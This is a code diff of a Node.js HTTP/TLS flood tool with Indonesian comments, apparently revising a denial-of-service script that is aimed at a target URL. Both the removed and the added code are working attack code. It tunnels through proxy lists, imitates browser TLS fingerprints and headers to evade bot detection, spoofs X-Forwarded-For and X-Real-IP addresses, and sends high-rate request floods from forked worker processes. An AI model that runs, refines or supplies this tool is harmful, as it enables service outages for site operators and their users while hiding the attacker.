@@ -1,5 +1,5 @@
 const net = require("net");
-const http2 = require("http2");
+const http = require("http");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
@@ -9,67 +9,53 @@ const fs = require("fs");
 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 
-if (process.argv.length < 5){
-    console.log(`Usage: node tls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://example.com/ 120 16 4`); 
-    console.log(`Atau tanpa proxy: node tls.js https://example.com/ 120 16 4 --noproxy`);
+if (process.argv.length < 5) {
+    console.log(`Usage: node rawtls.js URL TIME REQ_PER_SEC THREADS\nExample: node tls.js https://target.com 500 8 1`);
     process.exit();
 }
 
-// Cek apakah menggunakan proxy atau langsung
-const useProxy = process.argv[6] !== "--noproxy";
-
-// Support TLS 1.2 dan 1.3
-const ciphersTLS12 = [
-    "TLS_AES_256_GCM_SHA384",
-    "TLS_AES_128_GCM_SHA256",
-    "TLS_CHACHA20_POLY1305_SHA256",
-    "ECDHE-ECDSA-AES128-GCM-SHA256",
-    "ECDHE-RSA-AES128-GCM-SHA256",
-    "ECDHE-ECDSA-AES256-GCM-SHA384",
-    "ECDHE-RSA-AES256-GCM-SHA384",
-    "ECDHE-ECDSA-CHACHA20-POLY1305",
-    "ECDHE-RSA-CHACHA20-POLY1305"
+// Cipher settings untuk TLS
+const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
+const ciphers = "GREASE:" + [
+    defaultCiphers[2],
+    defaultCiphers[1],
+    defaultCiphers[0],
+    ...defaultCiphers.slice(3)
 ].join(":");
 
-const ecdhCurve = "x25519:secp256r1:secp384r1";
+const sigalgs = "ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256:ecdsa_secp384r1_sha384:rsa_pss_rsae_sha384:rsa_pkcs1_sha384:rsa_pss_rsae_sha512:rsa_pkcs1_sha512";
+const ecdhCurve = "GREASE:x25519:secp256r1:secp384r1";
 
-const secureOptions = 
- crypto.constants.SSL_OP_NO_SSLv2 |
- crypto.constants.SSL_OP_NO_SSLv3 |
- crypto.constants.SSL_OP_NO_TLSv1 |
- crypto.constants.SSL_OP_NO_TLSv1_1 |
- crypto.constants.ALPN_ENABLED |
- crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE;
+const secureOptions =
+    crypto.constants.SSL_OP_NO_SSLv2 |
+    crypto.constants.SSL_OP_NO_SSLv3 |
+    crypto.constants.SSL_OP_NO_TLSv1 |
+    crypto.constants.SSL_OP_NO_TLSv1_1 |
+    crypto.constants.ALPN_ENABLED |
+    crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
+    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
+    crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
+    crypto.constants.SSL_OP_COOKIE_EXCHANGE |
+    crypto.constants.SSL_OP_SINGLE_DH_USE |
+    crypto.constants.SSL_OP_SINGLE_ECDH_USE |
+    crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
+
+const secureProtocol = "TLS_client_method";
 
 const secureContextOptions = {
-    ciphers: ciphersTLS12,
+    ciphers: ciphers,
+    sigalgs: sigalgs,
     honorCipherOrder: true,
     secureOptions: secureOptions,
-    minVersion: "TLSv1.2",
-    maxVersion: "TLSv1.3"
+    secureProtocol: secureProtocol
 };
 
 const secureContext = tls.createSecureContext(secureContextOptions);
 
-// Load proxies jika ada
-var proxies = [];
-if (useProxy) {
-    try {
-        proxies = fs.readFileSync("proxy.txt", "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
-        console.log(`📡 Loaded ${proxies.length} proxies`);
-    } catch(e) {
-        console.log(`⚠️  No proxy.txt found, using direct connection`);
-    }
-}
-
-// User Agents built-in
-const userAgents = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
-];
+// Baca proxy dan user agent
+var proxyFile = "proxy.txt";
+var proxies = readLines(proxyFile);
+var userAgents = readLines("ua.txt");
 
 const args = {
     target: process.argv[2],
@@ -79,64 +65,84 @@ const args = {
 }
 
 const parsedTarget = url.parse(args.target);
+const targetHost = parsedTarget.hostname;
+const targetPort = parsedTarget.port || 443;
+const targetPath = parsedTarget.path || "/";
 
-// Statistik global
-let stats = {
-    total: 0,
-    success: 0,
-    blocked: 0,
-    error: 0,
-    active: 0
-};
-
+// Cluster master
 if (cluster.isMaster) {
-    console.log(`🔥 Starting Flood Attack`);
-    console.log(`🎯 Target: ${args.target}`);
-    console.log(`⏱️  Duration: ${args.time} seconds`);
-    console.log(`⚡ Rate: ${args.Rate} req/sec per connection`);
-    console.log(`🧵 Threads: ${args.threads}`);
-    console.log(`🔒 TLS Version: 1.2 & 1.3`);
-    console.log(`🌐 Proxy Mode: ${useProxy ? "Enabled" : "Disabled"}`);
-    console.log(`====================================`);
-    
-    // Live stats setiap 3 detik
-    const statsInterval = setInterval(() => {
-        console.log(`\n📊 STATS UPDATE [${new Date().toLocaleTimeString()}]:`);
-        console.log(`   Total: ${stats.total}`);
-        console.log(`   ✅ Success: ${stats.success} (${((stats.success/stats.total)*100 || 0).toFixed(2)}%)`);
-        console.log(`   🚫 Blocked: ${stats.blocked} (${((stats.blocked/stats.total)*100 || 0).toFixed(2)}%)`);
-        console.log(`   ❌ Error: ${stats.error}`);
-        console.log(`   🔗 Active: ${stats.active}`);
-    }, 3000);
-    
     for (let counter = 1; counter <= args.threads; counter++) {
         cluster.fork();
     }
-    
     setTimeout(() => {
-        clearInterval(statsInterval);
-        console.log(`\n✅ Attack Finished!`);
-        console.log(`📊 Final Stats:`);
-        console.log(`   Total Requests: ${stats.total}`);
-        console.log(`   ✅ Success: ${stats.success} (${((stats.success/stats.total)*100 || 0).toFixed(2)}%)`);
-        console.log(`   🚫 Blocked: ${stats.blocked} (${((stats.blocked/stats.total)*100 || 0).toFixed(2)}%)`);
-        console.log(`   ❌ Error: ${stats.error}`);
         process.exit(1);
     }, args.time * 1000);
 } else {
-    // Worker processes
-    console.log(`Worker ${cluster.worker.id} started`);
-    
-    // Multiple intervals per worker untuk rate yang lebih tinggi
-    const intervalsPerWorker = Math.min(2000, args.Rate);
-    for (let i = 0; i < intervalsPerWorker; i++) {
-        setTimeout(() => {
-            setInterval(() => {
-                if (stats.active < 10000) {
-                    runFlooder();
-                }
-            }, Math.max(1, Math.floor(1000 / (args.Rate / intervalsPerWorker))));
-        }, i * 1);
+    // Worker: jalankan flooder dengan interval
+    for (let i = 0; i < 10; i++) {
+        setInterval(runFlooder, 0);
+    }
+}
+
+class NetSocket {
+    constructor() { }
+
+    HTTP(options, callback) {
+        const parsedAddr = options.address.split(":");
+        const addrHost = parsedAddr[0];
+        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\n" +
+            "Host: " + options.address + ":443\r\n" +
+            "Proxy-Connection: Keep-Alive\r\n" +
+            "User-Agent: " + randomElement(userAgents) + "\r\n\r\n";
+
+        const buffer = Buffer.from(payload);
+
+        const connection = net.connect({
+            host: options.host,
+            port: options.port,
+            allowHalfOpen: true,
+            writable: true,
+            readable: true
+        });
+
+        connection.setTimeout(options.timeout * 1000);
+        connection.setKeepAlive(true, 60000);
+        connection.setNoDelay(true);
+
+        connection.on("connect", () => {
+            connection.write(buffer);
+        });
+
+        connection.on("data", chunk => {
+            const response = chunk.toString("utf-8");
+            const isAlive = response.includes("HTTP/1.1 200") || response.includes("HTTP/1.0 200");
+            if (isAlive === false) {
+                connection.destroy();
+                return callback(undefined, "error: invalid response from proxy server");
+            }
+            return callback(connection, undefined);
+        });
+
+        connection.on("timeout", () => {
+            connection.destroy();
+            return callback(undefined, "error: timeout exceeded");
+        });
+
+        connection.on("error", error => {
+            connection.destroy();
+            return callback(undefined, "error: " + error.message);
+        });
+    }
+}
+
+const Socker = new NetSocket();
+
+function readLines(filePath) {
+    try {
+        return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
+    } catch (err) {
+        console.log(`Error reading ${filePath}: ${err.message}`);
+        return [];
     }
 }
 
@@ -149,209 +155,163 @@ function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 }
 
-function randomString(length) {
-    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-    let result = "";
-    for (let i = 0; i < length; i++) {
-        result += chars.charAt(Math.floor(Math.random() * chars.length));
-    }
-    return result;
+function generateRandomIP() {
+    return `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(1, 255)}`;
 }
 
-function randomIP() {
-    return randomIntn(1,255) + "." + randomIntn(1,255) + "." + randomIntn(1,255) + "." + randomIntn(1,255);
+function generateRandomReferer() {
+    const referers = [
+        "https://www.google.com/",
+        "https://www.bing.com/",
+        "https://www.yahoo.com/",
+        "https://" + targetHost + "/",
+        "https://www.facebook.com/",
+        "https://www.twitter.com/",
+        "https://www.instagram.com/",
+        ""
+    ];
+    return randomElement(referers);
+}
+
+// Header HTTP/1.1 yang lebih mirip browser
+function buildHeaders(proxyIP) {
+    const acceptList = [
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+    ];
+
+    const acceptLanguageList = [
+        "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
+        "en-US,en;q=0.9",
+        "ms-MY,ms;q=0.9,en-US;q=0.8,en;q=0.7",
+        "zh-CN,zh;q=0.9,en;q=0.8"
+    ];
+
+    const secChUA = [
+        '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
+        '"Microsoft Edge";v="121", "Not(A:Brand";v="99", "Chromium";v="121"',
+        '"Brave";v="121", "Not(A:Brand";v="99", "Chromium";v="121"'
+    ];
+
+    const platformList = ["Windows", "macOS", "Linux", "Android", "iOS"];
+
+    return {
+        "Host": targetHost,
+        "User-Agent": randomElement(userAgents),
+        "Accept": randomElement(acceptList),
+        "Accept-Language": randomElement(acceptLanguageList),
+        "Accept-Encoding": "gzip, deflate, br",
+        "Connection": "keep-alive",
+        "Upgrade-Insecure-Requests": "1",
+        "Cache-Control": "no-cache, no-store, private, max-age=0",
+        "Pragma": "no-cache",
+        "Sec-Fetch-Dest": "document",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Ch-Ua": randomElement(secChUA),
+        "Sec-Ch-Ua-Mobile": randomElement(["?0", "?1"]),
+        "Sec-Ch-Ua-Platform": randomElement(platformList),
+        "X-Forwarded-For": proxyIP,
+        "X-Real-IP": proxyIP,
+        "Referer": generateRandomReferer()
+    };
 }
 
 function runFlooder() {
-    stats.active++;
-    
-    const makeRequest = (proxyConn) => {
-        const settings = {
-            enablePush: false,
-            initialWindowSize: 2147483647,
-            maxConcurrentStreams: 1000
-        };
+    if (proxies.length === 0) {
+        console.log("No proxies available");
+        return;
+    }
+
+    const proxyAddr = randomElement(proxies);
+    const parsedProxy = proxyAddr.split(":");
+
+    if (parsedProxy.length < 2) return;
+
+    const proxyIP = parsedProxy[0];
+    const proxyPort = ~~parsedProxy[1];
+
+    const proxyOptions = {
+        host: proxyIP,
+        port: proxyPort,
+        address: targetHost + ":443",
+        timeout: 10
+    };
+
+    Socker.HTTP(proxyOptions, (connection, error) => {
+        if (error || !connection) return;
+
+        connection.setKeepAlive(true, 60000);
+        connection.setNoDelay(true);
 
         const tlsOptions = {
-            port: 443,
-            ALPNProtocols: ["h2", "http/1.1"],
-            ciphers: ciphersTLS12,
-            requestCert: false,
+            port: targetPort,
+            secure: true,
+            ALPNProtocols: ["http/1.1"],
+            ciphers: ciphers,
+            sigalgs: sigalgs,
+            requestCert: true,
+            socket: connection,
             ecdhCurve: ecdhCurve,
-            honorCipherOrder: true,
-            host: parsedTarget.host,
+            honorCipherOrder: false,
+            host: targetHost,
             rejectUnauthorized: false,
+            clientCertEngine: "dynamic",
             secureOptions: secureOptions,
             secureContext: secureContext,
-            servername: parsedTarget.host,
+            servername: targetHost,
+            secureProtocol: secureProtocol,
             minVersion: "TLSv1.2",
             maxVersion: "TLSv1.3"
         };
 
-        // Jika ada proxy connection, gunakan socket dari proxy
-        if (proxyConn) {
-            tlsOptions.socket = proxyConn;
-        }
+        const tlsConn = tls.connect(targetPort, targetHost, tlsOptions);
 
-        const tlsConn = proxyConn ? 
-            tls.connect(443, parsedTarget.host, tlsOptions) :
-            tls.connect(443, parsedTarget.host, tlsOptions);
-
+        tlsConn.allowHalfOpen = true;
         tlsConn.setNoDelay(true);
         tlsConn.setKeepAlive(true, 60000);
         tlsConn.setMaxListeners(0);
 
-        let requestInterval;
-        
-        tlsConn.once("secureConnect", () => {
-            const client = http2.connect(parsedTarget.href, {
-                protocol: "https:",
-                settings: settings,
-                createConnection: () => tlsConn,
-                maxSessionMemory: 1000
-            });
+        tlsConn.on("secureConnect", () => {
+            // Kirim request HTTP/1.1 secara berulang
+            const intervalAttack = setInterval(() => {
+                for (let i = 0; i < args.Rate; i++) {
+                    const fakeIP = generateRandomIP();
+                    const headers = buildHeaders(fakeIP);
 
-            client.setMaxListeners(0);
-            
-            const startTime = Date.now();
-            
-            requestInterval = setInterval(() => {
-                const elapsed = Date.now() - startTime;
-                if (elapsed > args.time * 1000) {
-                    clearInterval(requestInterval);
-                    client.destroy();
-                    if (proxyConn) proxyConn.destroy();
-                    stats.active--;
-                    return;
-                }
-                
-                // Kirim request
-                const randomPath = parsedTarget.path + 
-                    (Math.random() > 0.5 ? "?" + randomString(8) + "=" + randomString(6) : "");
-                
-                const headers = {
-                    [":method"]: "GET",
-                    [":path"]: randomPath,
-                    [":scheme"]: "https",
-                    [":authority"]: parsedTarget.host,
-                    "user-agent": randomElement(userAgents),
-                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                    "accept-language": "en-US,en;q=0.9",
-                    "accept-encoding": "gzip, deflate, br",
-                    "cache-control": "no-cache",
-                    "pragma": "no-cache",
-                    "referer": "https://" + parsedTarget.host,
-                    "x-forwarded-for": randomIP(),
-                    "x-real-ip": randomIP()
-                };
-                
-                try {
-                    const request = client.request(headers);
-                    request.on("response", (responseHeaders) => {
-                        const statusCode = responseHeaders[":status"];
-                        stats.total++;
-                        
-                        if (statusCode === 200 || statusCode === 301 || statusCode === 302) {
-                            stats.success++;
-                        } else if (statusCode === 403 || statusCode === 503 || statusCode === 429) {
-                            stats.blocked++;
-                        } else {
-                            stats.error++;
+                    // Build HTTP request
+                    let requestStr = `GET ${targetPath} HTTP/1.1\r\n`;
+                    for (const [key, value] of Object.entries(headers)) {
+                        if (value) {
+                            requestStr += `${key}: ${value}\r\n`;
                         }
-                        
-                        request.close();
-                        request.destroy();
-                    });
-                    request.on("error", () => {
-                        stats.total++;
-                        stats.error++;
-                    });
-                    request.end();
-                } catch(e) {
-                    stats.total++;
-                    stats.error++;
+                    }
+                    requestStr += "\r\n";
+
+                    tlsConn.write(requestStr);
+
+                    // Optional: baca response tapi tidak diproses untuk efisiensi
+                    tlsConn.resume();
                 }
-            }, Math.max(10, Math.floor(1000 / args.Rate)));
-            
-            client.requestInterval = requestInterval;
+            }, 1000);
+
+            // Cleanup interval jika koneksi mati
+            tlsConn.once("close", () => {
+                clearInterval(intervalAttack);
+            });
         });
 
-        tlsConn.on("error", (err) => {
-            if (requestInterval) clearInterval(requestInterval);
-            if (proxyConn) proxyConn.destroy();
-            stats.active--;
+        tlsConn.on("error", (error) => {
+            tlsConn.destroy();
+            if (connection) connection.destroy();
         });
-        
-        if (proxyConn) {
-            proxyConn.on("error", () => {
-                if (requestInterval) clearInterval(requestInterval);
-                tlsConn.destroy();
-                stats.active--;
-            });
-            
-            proxyConn.on("close", () => {
-                if (requestInterval) clearInterval(requestInterval);
-                stats.active--;
-            });
-        }
-        
+
         tlsConn.on("close", () => {
-            if (requestInterval) clearInterval(requestInterval);
-            stats.active--;
+            if (connection) connection.destroy();
         });
-    };
-    
-    // Jika menggunakan proxy
-    if (useProxy && proxies.length > 0) {
-        const proxyAddr = randomElement(proxies);
-        if (proxyAddr) {
-            const parsedProxy = proxyAddr.split(":");
-            if (parsedProxy.length >= 2) {
-                const proxyConn = net.connect({
-                    host: parsedProxy[0],
-                    port: ~~parsedProxy[1],
-                    allowHalfOpen: true
-                });
-                
-                proxyConn.setTimeout(10000);
-                proxyConn.setKeepAlive(true, 30000);
-                
-                const payload = "CONNECT " + parsedTarget.host + ":443 HTTP/1.1\r\nHost: " + parsedTarget.host + "\r\nUser-Agent: " + randomElement(userAgents) + "\r\n\r\n";
-                
-                proxyConn.on("connect", () => {
-                    proxyConn.write(payload);
-                });
-                
-                proxyConn.on("data", (chunk) => {
-                    const response = chunk.toString();
-                    if (response.includes("200 Connection established") || response.includes("HTTP/1.1 200")) {
-                        proxyConn.removeAllListeners("data");
-                        makeRequest(proxyConn);
-                    } else {
-                        proxyConn.destroy();
-                        stats.active--;
-                    }
-                });
-                
-                proxyConn.on("error", () => {
-                    stats.active--;
-                });
-                
-                proxyConn.on("timeout", () => {
-                    proxyConn.destroy();
-                    stats.active--;
-                });
-                
-                return;
-            }
-        }
-    }
-    
-    // Direct connection (tanpa proxy)
-    makeRequest(null);
+    });
 }
 
-process.on('uncaughtException', (error) => {
-    if (stats.active > 0) stats.active--;
-});
-process.on('unhandledRejection', (error) => {});
+process.on('uncaughtException', error => { });
+process.on('unhandledRejection', error => { });
